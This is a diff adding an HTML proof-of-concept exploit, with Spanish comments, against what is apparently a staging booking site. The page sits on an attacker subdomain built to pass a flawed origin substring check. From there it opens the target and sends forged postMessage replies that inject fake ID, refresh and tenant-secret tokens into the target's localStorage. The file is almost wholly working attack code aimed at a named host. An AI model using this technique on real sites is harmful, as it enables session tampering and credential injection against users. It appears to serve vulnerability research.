@@ -1,6 +1,75 @@
+<!-- https://cloud.staging-enviso.io.attacker.com/attack.html -->
 <!DOCTYPE html>
 <html>
+<head><title>XD Attack PoC</title></head>
 <body>
-<h1>test</h1>
+<script>
+const BOOKING_ORIGIN = "https://booking.staging-enviso.io";
+const NAMESPACE = "cross-domain";
+
+// Tokens de demostración (en ataque real serían tokens del atacante)
+const FAKE_TOKENS = {
+  id_token: "INJECTED_FAKE_ID_TOKEN",
+  ad_id_token: "INJECTED_AD_TOKEN",
+  refreshToken: "INJECTED_REFRESH_TOKEN",
+  user: JSON.stringify({ id: 1337, email: "pwned@attacker.com", name: "INJECTED" }),
+  lang: "en",
+  TenantSecretKey: "INJECTED_TENANT_SECRET",
+  tenant: "INJECTED_TENANT",
+  tenants: "[]",
+  lastLoginDate: new Date().toISOString(),
+  guide: "false"
+};
+
+// La víctima abre esta página (via link, phishing, etc.)
+// booking.staging-enviso.io se abre en una nueva pestaña cuyo opener somos nosotros
+function launchAttack() {
+  const bookingWindow = window.open(BOOKING_ORIGIN, "booking");
+  
+  // Esperamos a que cargue y empiece a mandar mensajes
+  window.addEventListener("message", (e) => {
+    // IMPORTANTE: el check .includes() nos valida porque nuestro origin
+    // contiene "cloud.staging-enviso.io" como substring
+    console.log("[ATTACKER] Received message from booking:", e.data, "origin:", e.origin);
+  });
+
+  // Interceptamos mensajes que vienen del booking hacia su iframe legítimo
+  // No podemos leerlos directamente, pero sí podemos mandar respuestas falsas
+  
+  // Estrategia: después de ~1s el app hace getItem("ADS_LASTSYNC") → Ie=0
+  // Respondemos con timestamp futuro → app hace getmulti → Ie=1
+  // Respondemos con fake tokens → tokens inyectados en localStorage
+  
+  setTimeout(() => {
+    // Respuesta falsa al getItem("ADS_LASTSYNC") (ID=0)
+    // Con timestamp muy alto para forzar el PULL branch
+    bookingWindow.postMessage({
+      namespace: NAMESPACE,
+      id: 0,  // primer sendMessage del app
+      value: String(Date.now() + 1000000)  // futuro → forza getmulti
+    }, BOOKING_ORIGIN);
+  }, 1200);
+
+  setTimeout(() => {
+    // Respuesta falsa al getmulti (ID=1)
+    bookingWindow.postMessage({
+      namespace: NAMESPACE,
+      id: 1,
+      value: FAKE_TOKENS
+    }, BOOKING_ORIGIN);
+  }, 1400);
+}
+
+// Para demostración, verificamos después
+setTimeout(() => {
+  console.log("[RESULT] Check localStorage in booking tab for injected values");
+}, 3000);
+</script>
+
+<button onclick="launchAttack()">Launch Attack PoC</button>
+<p>Origin: <script>document.write(location.origin)</script></p>
+<p>Passes .includes("https://cloud.staging-enviso.io"): 
+  <script>document.write(location.origin.includes("https://cloud.staging-enviso.io"))</script>
+</p>
 </body>
 </html>
